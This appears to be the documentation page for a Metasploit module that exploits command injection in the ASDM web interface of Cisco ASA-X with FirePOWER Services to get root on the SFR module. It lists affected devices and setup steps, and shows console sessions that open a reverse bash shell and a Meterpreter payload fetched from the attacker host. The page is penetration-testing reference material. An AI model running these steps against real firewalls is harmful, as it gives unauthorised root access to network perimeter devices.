## Vulnerable Application

### Description

This module exploits a command injection vulnerability affecting Cisco ASA-X
with FirePOWER Services devices using the on-board SFR module. The attack
is executed through the ASA's ASDM web server and lands in the SFR module's
underlying Linux system. This module requires credentials for a user that
can execute `session sfr do` (the default ASDM admin has sufficient permission)
and the sfr module must be configured.

The result of successful exploitation is root access on the SFR module. TODO
words about this position in the network.

The following Cisco devices are believed to be affected:

- Cisco ASA 5506H-X with FirePOWER Services
- Cisco ASA 5506W-X with FirePOWER Services
- Cisco ASA 5508-X with FirePOWER Services
- Cisco ASA 5512-X with FirePOWER Services
- Cisco ASA 5515-X with FirePOWER Services
- Cisco ASA 5516-X with FirePOWER Services
- Cisco ASA 5525-X with FirePOWER Services
- Cisco ASA 5545-X with FirePOWER Services
- Cisco ASA 5555-X with FirePOWER Services
- Cisco ISA-3000-2C2F
- Cisco ISA-3000-4C

### Setup

The vulnerable system is a hardware firewall that, to our knowledge,
cannot be emulated. As such, testing requires a physical device. Also,
downloading ASA-X with FirePOWER Services firmware/software requires
a valid contract with Cisco.

If you acquire a device, it should, in theory come pre-installed with
the SFR module. If it is not pre-installed or you do something terrible
to upset the SFR module then you can follow the following [guide](https://www.cisco.com/c/en/us/support/docs/security/asa-firepower-services/118644-configure-firepower-00.html#anc5) to reinstall it.

As with anything with Cisco ASA, configuring ASDM can be a journey, but
theoritically the following three commands should get you close. If you
get lost, [this guide](https://www.cisco.com/c/en/us/td/docs/security/asa/asa94/config-guides/asdm74/general/asdm-74-general-config/intro-start.html#concept_3CB00F667CE04C65843E42B85BA5619B) should help.

```
asdm image disk0:/asdm<version>.bin
http server enable
http network mask inside
```

Where network and mask are who you want to be able to access it and inside
is the zone. E.g. "0.0.0.0 0.0.0.0 outside" is the internet. And that should
satisfy the pre-requisites for exploitation (ASDM+sfr).

## Verification Steps

* Follow setup steps above.
* Do: `use exploit/linux/http/cisco_asax_sfr_rce`
* Do: `set USERNAME <username>`
* Do: `set PASSWORD <password>`
* Do: `set RHOST <ip>`
* Do: `set LHOST <ip>`
* Do: `check`
* Verify the remote host is vulnerable.
* Do: `run`
* Verify the module acquires a root shell

## Options

### USERNAME

The username to authenticate with the ASDM http web server with.

### PASSWORD

The password to authenticate with the ASDM http web server with.

## Scenarios

### Successful exploitation of ASA 5506-X with FirePOWER Services for a root shell

```
msf6 > use exploit/linux/http/cisco_asax_sfr_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set USERNAME admin
USERNAME => admin
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set PASSWORD labpass1
PASSWORD => labpass1
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set RHOST 10.0.0.21
RHOST => 10.0.0.21
msf6 exploit(linux/http/cisco_asax_sfr_rce) > check
[+] 10.0.0.21:443 - The target is vulnerable. Successfully executed the 'id' command.
msf6 exploit(linux/http/cisco_asax_sfr_rce) > run

[*] Started reverse TCP handler on 10.0.0.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully executed the 'id' command.
[*] Executing Shell Dropper for cmd/unix/reverse_bash
[*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.21:43056 ) at 2022-04-21 12:49:15 -0700

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux firepower 3.10.107sf.cisco-1 #1 SMP PREEMPT Thu Mar 8 18:29:04 UTC 2018 x86_64 GNU/Linux
```

### Successful exploitation of ASA 5506-X with FirePOWER Services for a Meterpreter shell

```
msf6 > use exploit/linux/http/cisco_asax_sfr_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set USERNAME admin
USERNAME => admin
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set PASSWORD labpass1
PASSWORD => labpass1
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set RHOST 10.0.0.21
RHOST => 10.0.0.21
msf6 exploit(linux/http/cisco_asax_sfr_rce) > check
[+] 10.0.0.21:443 - The target is vulnerable. Successfully executed the 'id' command.
msf6 exploit(linux/http/cisco_asax_sfr_rce) > set TARGET 1
TARGET => 1
msf6 exploit(linux/http/cisco_asax_sfr_rce) > run

[*] Started reverse TCP handler on 10.0.0.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully executed the 'id' command.
[*] Executing Linux Dropper for linux/x64/meterpreter_reverse_tcp
[*] Using URL: http://10.0.0.2:8080/FeB2t5vKpa
[*] Client 10.0.0.21 (curl/7.48.0) requested /FeB2t5vKpa
[*] Sending payload to 10.0.0.21 (curl/7.48.0)
[*] Meterpreter session 2 opened (10.0.0.2:4444 -> 10.0.0.21:43058 ) at 2022-04-21 12:51:44 -0700
[*] Command Stager progress - 100.00% done (111/111 bytes)
[*] Server stopped.

meterpreter > shell
Process 6315 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux firepower 3.10.107sf.cisco-1 #1 SMP PREEMPT Thu Mar 8 18:29:04 UTC 2018 x86_64 GNU/Linux
```
